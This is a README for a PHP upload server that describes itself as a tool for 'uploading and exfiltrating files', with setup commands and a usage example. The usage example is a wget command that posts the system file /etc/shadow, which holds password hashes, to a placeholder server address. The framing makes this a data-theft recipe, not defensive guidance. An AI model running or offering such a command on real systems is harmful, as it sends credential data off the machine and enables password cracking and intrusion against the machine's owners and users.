# PHP File Uploader
A secure and efficient solution for uploading and exfiltrating files using PHP.

## Installation
1. Host the "upload.php" file on your server.

```
php -S <server_ip>:8080 -t .
```
2. Create the "upload" directory and configure its settings.

```
mkdir upload
```
3. Set the appropriate permissions for the "upload" folder (write-only).

```
cd upload && umask 555
```
4. Optionally, change the ownership of the "upload" folder to enhance security.

```
useradd dummy && chown dummy upload
```

## Usage
To upload a file to the server, use the following method as an example:

```
wget --post-file=/etc/shadow <server_ip>/upload.php?file=shadow
```

Replace `<server_ip>` with the IP address of your server and adjust the file path as needed.